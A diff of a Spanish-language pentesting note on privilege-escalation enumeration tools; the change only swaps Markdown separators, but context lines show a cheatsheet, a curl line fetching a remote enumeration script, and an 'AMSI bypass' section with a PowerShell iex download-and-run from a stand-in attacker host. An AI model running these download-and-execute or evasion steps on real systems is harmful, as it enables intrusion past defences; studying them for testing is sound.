@@ -30,7 +30,7 @@ linked:
 ---
 # PrivEsc Enumeration Tools
 
-***
+---
 
 ## Cheatsheet
 
@@ -47,7 +47,7 @@ linked:
 | **wes.py** | Windows | `wes.py systeminfo.txt --impacts 'Elevation of Privilege'` |
 | **accesschk** | Windows | `accesschk.exe /accepteula -uwcqv "Authenticated Users" *` |
 
-***
+---
 
 ## Concepto
 
@@ -55,7 +55,7 @@ Tools que automatizan enum para **privilege escalation**. Correr primero, leer o
 
 **Regla**: `linpeas` / `winpeas` cubren 80% de vectores; `pspy` / `Seatbelt` complementan (procesos no visibles al user, secrets en registry/memoria).
 
-***
+---
 
 ## LINUX
 
@@ -152,7 +152,7 @@ curl -s https://raw.githubusercontent.com/HackTricks/scripts/master/linux_enum.s
 ./unix-privesc-check standard > upc.out
 ```
 
-***
+---
 
 ## WINDOWS
 
@@ -291,7 +291,7 @@ accesschk.exe /accepteula -quvw wuauserv
 
 Ver [[PowerView]] — cubre enum de ACL, GPO, kerberoastable cuentas para local → domain chain.
 
-***
+---
 
 ## AMSI bypass rápido (Windows)
 
@@ -310,7 +310,7 @@ iex (new-object net.webclient).downloadstring('http://atk/winPEAS.ps1')
 
 Si AMSI patch falla → usar versión `.exe` cargada via reflección (`evil-winrm` `Invoke-Binary`) o via AppLocker bypass (`InstallUtil`).
 
-***
+---
 
 ## Workflow recomendado
 
@@ -347,7 +347,7 @@ whoami /all; systeminfo; net localgroup administrators; net user $env:USERNAME /
 .\Watson.exe
 ```
 
-***
+---
 
 ## Opsec
 
@@ -368,4 +368,4 @@ whoami /all; systeminfo; net localgroup administrators; net user $env:USERNAME /
 - [HackTricks Checklist - Linux](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)
 - [HackTricks Checklist - Windows](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)
 
-***
+---
